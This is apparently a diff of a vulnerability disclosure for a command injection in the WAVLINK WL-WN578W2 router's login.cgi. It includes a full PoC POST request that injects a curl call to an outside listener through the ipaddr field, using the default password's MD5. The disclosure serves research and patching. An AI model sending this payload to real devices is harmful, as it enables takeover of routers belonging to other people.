@@ -1,141 +1,72 @@
-\# WAVLINK WL-WN578W2 M78W2\\\_V221110 Command Injection (sys\\\_login1 Action in login.cgi)
-
-
+# WAVLINK WL-WN578W2 M78W2\_V221110 Command Injection (sys\_login1 Action in login.cgi)
 
 PS:
 
 
 
+1.  QEMU simulation is difficult; use a physical WAVLINK WL-WN578W2 for testing.
 
+2.  Authenticated access required, but password uses fixed MD5 (no dynamic change). Attackers only need the password’s MD5 (e.g., default password) to reuse the exploit.
 
+## Overview
 
+A command injection vulnerability exists in the `sys_login1` action of `login.cgi` (WAVLINK WL-WN578W2, firmware M78W2\_V221110). The `ipaddr` parameter in `sub_401BA4` function (login.c) lacks sanitization and is directly concatenated into system commands. With `page=sys_login1` in POST requests to `/cgi-bin/login.cgi`, attackers with the password’s MD5 can inject arbitrary commands to control the device.
 
-1\.  QEMU simulation is difficult; use a physical WAVLINK WL-WN578W2 for testing.
 
 
+![Vulnerability Flow: sys\_login1 Action Logic](./imgs/1.png)
 
-2\.  Authenticated access required, but `password` uses fixed MD5 (no dynamic change). Attackers only need the password’s MD5 (e.g., default password) to reuse the exploit.
+## Details
 
 
 
-\## Overview
+*   **Vendor**: WAVLINK
 
+*   **Product**: WAVLINK WL-WN578W2
 
+*   **Firmware**: M78W2\_V221110
 
-A command injection vulnerability exists in the `sys\_login1` action of `login.cgi` (WAVLINK WL-WN578W2, firmware M78W2\\\_V221110). The `ipaddr` parameter in `sub\_401BA4` function (login.c) lacks sanitization and is directly concatenated into system commands. With `page=sys\_login1` in POST requests to `/cgi-bin/login.cgi`, attackers with the password’s MD5 can inject arbitrary commands to control the device.
+*   **Affected Endpoint**: `/cgi-bin/login.cgi` (POST method, trigger via `page=sys_login1`)
 
+*   **Vulnerable Code**: `ftext` function (request routing) & `sub_401BA4` function (core login logic) in login.c
 
+*   **Vulnerability Type**: Command Injection
 
+*   **CVE ID**: Pending
 
+*   **Impact**: Execute arbitrary system commands, read sensitive files, fully control the device; exploit is reusable via fixed password MD5.
 
+*   **Reported by**: n0ps1ed (n0ps1edzz@gmail.com)
 
+### Description
 
-!\[Vulnerability Flow](./imgs/1.png)
 
 
+1.  **Request Routing**: The `ftext` function parses the `page=sys_login1` parameter from the request and calls the `sub_401BA4` function to process core logic.
 
-\## Details
+2.  **Password Verification**: `sub_401BA4` uses the command `echo -n '%s' | md5sum` to verify the input password (fixed MD5 encryption logic, no dynamic changes).
 
+3.  **Command Injection**: The `ipaddr` parameter is not sanitized and is directly used in system command concatenation. Attackers can use delimiters (e.g., `;`) to inject malicious commands.
 
 
 
+![MD5 Verification Logic: Fixed Encryption Process](./imgs/2.png)
 
 
 
-\*   \*\*Vendor\*\*: WAVLINK
+![Vulnerable Command Flow: ipaddr Parameter Usage](./imgs/3.png)
 
+## Proof of Concept (PoC)
 
+### PoC: Inject `curl` Command to Verify Execution
 
-\*   \*\*Product\*\*: WAVLINK WL-WN578W2
+Requires the device password’s fixed MD5 (e.g., `e10adc3949ba59abbe56e057f20f883e` corresponds to the default password `123456`).
 
-
-
-\*   \*\*Firmware\*\*: M78W2\\\_V221110
-
-
-
-\*   \*\*Affected Endpoint\*\*: `/cgi-bin/login.cgi` (POST, `page=sys\_login1`)
-
-
-
-\*   \*\*Vulnerable Code\*\*: `ftext` (request routing) \& `sub\_401BA4` (core logic) in login.c
-
-
-
-\*   \*\*Vulnerability Type\*\*: Command Injection
-
-
-
-\*   \*\*CVE ID\*\*: Pending
-
-
-
-\*   \*\*Impact\*\*: Execute commands, read sensitive files, control the device; reusable via fixed password MD5.
-
-
-
-\*   \*\*Reported by\*\*: n0ps1ed (n0ps1edzz@gmail.com)
-
-
-
-\### Description
-
-
-
-
-
-
-
-\*   \*\*Request Routing\*\*: `ftext` function parses `page=sys\_login1` and calls `sub\_401BA4`.
-
-
-
-\*   \*\*Password Verification\*\*: `sub\_401BA4` uses `echo -n '%s' | md5sum` to verify the input `password` (fixed MD5 logic).
-
-
-
-\*   \*\*Command Injection\*\*: `ipaddr` parameter is unsanitized and directly used in system commands. Attackers use delimiters (e.g., `;`) to inject malicious commands.
-
-
-
-
-
-
-
-!\[MD5 Verification Logic](./imgs/2.png)
-
-
-
-
-
-
-
-!\[Vulnerable Command Flow](./imgs/3.png)
-
-
-
-\## Proof of Concept (PoC)
-
-
-
-\### PoC: Inject `curl` Command
-
-
-
-Requires the device password’s fixed MD5 (e.g., `e10adc3949ba59abbe56e057f20f883e` = default `123456`).
-
-
-
-\#### Full PoC Request
-
-
-
-
+#### Full PoC HTTP Request
 
 
 
 ```
-
 POST /cgi-bin/login.cgi HTTP/1.1
 Host: 192.168.10.1
 Content-Length: 145
@@ -145,52 +76,24 @@ Origin: http://192.168.10.1
 Content-Type: application/x-www-form-urlencoded
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Referer: http://192.168.10.1/
 Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
 
-
-
-page=sys_login1&ipaddr=%3A%3Affff%3A192.168.10.154;curl http://192.168.10.154:1234#&key=M55373357&password=e10adc3949ba59abbe56e057f20f883e
-
+page=sys\_login1\&ipaddr=::ffff:192.168.10.154;curl http://192.168.10.154:1234#\&key=M55373357\&password=e10adc3949ba59abbe56e057f20f883e
 ```
 
-
-
-\#### PoC Results
-
+#### PoC Execution Results
 
 
 
+1.  **Fixed MD5 Generation**: Run the command `echo -n '123456' | md5sum` on a Linux terminal to generate the password hash, which matches the `password` parameter in the PoC.
 
 
 
-1\.  \*\*Fixed MD5 Generation\*\*: Use `echo -n '123456' | md5sum` to get the password hash (matches PoC)
+![MD5 Generation: Command & Result](./imgs/4.png)
 
 
 
-
-
-
-
-!\[MD5 Generation](./imgs/4.png)
-
-
-
-
-
-
-
-1\.  \*\*Successful Injection\*\*: Device executes `curl`, attacker’s server records the request
-
-
-
-
-
-
-
-!\[Injection Success](./imgs/5.png)
-
-
-
+1.  **Successful Injection**: After sending the PoC request, the device executes the injected `curl` command, and the attacker’s server (192.168.10.154:1234) records the request, confirming command execution.
